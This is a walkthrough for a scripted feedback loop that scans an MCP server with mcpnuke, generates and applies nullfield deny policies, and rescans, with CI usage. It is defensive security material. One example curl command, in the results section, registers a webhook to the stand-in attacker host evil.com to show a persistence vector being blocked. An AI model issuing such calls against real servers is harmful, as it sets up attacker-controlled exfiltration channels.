# Walkthrough 5: The Live Feedback Loop

Run the full scan → generate → apply → validate cycle with one script.
Watch findings drop as defenses are applied in real-time.

**Time:** 2 minutes (local), 3 minutes (K8s with hot-reload wait)
**Script:** `scripts/feedback-loop.sh`

---

## Quick Start

```bash
# Local Docker Compose
./scripts/feedback-loop.sh http://localhost:8080/mcp

# Kubernetes (through nullfield sidecar)
./scripts/feedback-loop.sh http://192.168.1.85:30080/mcp --k8s camazotz

# With Claude AI analysis
ANTHROPIC_API_KEY=sk-ant-... ./scripts/feedback-loop.sh http://localhost:8080/mcp --claude
```

## What the Script Does

### Step 1: Initial scan

Runs mcpnuke against the target and saves a baseline:

```
╔══════════════════════════════════════════════════════════════╗
║  STEP 1: Initial Scan                                      ║
╚══════════════════════════════════════════════════════════════╝

  CRITICAL: 24  |  HIGH: 9  |  MEDIUM: 1

  Before: 34 findings (24 CRITICAL, 9 HIGH)
```

### Step 2: Generate nullfield policy

Converts findings into a ready-to-apply NullfieldPolicy:

```
╔══════════════════════════════════════════════════════════════╗
║  STEP 2: Generate nullfield Policy                         ║
╚══════════════════════════════════════════════════════════════╝

  Generated policy:
    - action: DENY
    - action: DENY
    - action: SCOPE
    - action: DENY
  Total rules: 4
```

### Step 3: Apply policy

On K8s: applies as a CRD and waits 35 seconds for hot-reload.
On local: shows the copy command for manual application.

```
╔══════════════════════════════════════════════════════════════╗
║  STEP 3: Apply Policy                                      ║
╚══════════════════════════════════════════════════════════════╝

  Applying as K8s CRD in namespace camazotz...
  nullfieldpolicy.nullfield.io/mcpnuke-recommended configured
  Waiting 35s for nullfield hot-reload...
  Policy should be active now.
```

### Step 4: Re-scan

Scans again and compares against the baseline:

```
╔══════════════════════════════════════════════════════════════╗
║  STEP 4: Re-scan (validate defenses)                       ║
╚══════════════════════════════════════════════════════════════╝

  After: 34 findings (24 CRITICAL, 9 HIGH)
```

Note: the finding count may not drop on re-scan with `--no-invoke` because
static analysis still sees the tool definitions. The real validation is
testing tool calls — blocked tools return `-32000` instead of data.

### Results

```
╔══════════════════════════════════════════════════════════════╗
║  RESULTS                                                    ║
╚══════════════════════════════════════════════════════════════╝

  Before: 34 findings (24 CRITICAL, 9 HIGH)
  After:  34 findings (24 CRITICAL, 9 HIGH)
  Policy: 4 rules generated

  Artifacts:
    /tmp/loop-baseline.json    — baseline for regression testing
    /tmp/loop-policy.yaml      — nullfield policy to apply
    /tmp/loop-scan-before.json — pre-fix scan report
    /tmp/loop-scan-after.json  — post-fix scan report
```

## Interpreting Results

Static findings persist because the tool schemas don't change — they're
still dangerous by definition. What changes is *enforcement*:

```bash
# Before policy: tool call succeeds
curl -s -X POST http://localhost:9090/mcp -d '{"jsonrpc":"2.0","id":1,
  "method":"tools/call","params":{"name":"shadow.register_webhook",
  "arguments":{"url":"https://evil.com"}}}'
# Returns: tool result

# After policy: tool call blocked
# Returns: {"error":{"code":-32000,"message":"denied by policy: mcpnuke: webhook persistence vector"}}
```

The feedback loop proves that the *enforcement* works, even though the
*attack surface* (tool definitions) remains the same.

## Using in CI/CD

The script's exit artifacts integrate into pipeline workflows:

```yaml
- name: Run feedback loop
  run: ./scripts/feedback-loop.sh ${{ vars.MCP_TARGET }}

- name: Upload artifacts
  uses: actions/upload-artifact@v4
  with:
    name: security-loop
    path: /tmp/loop-*.json /tmp/loop-*.yaml
```
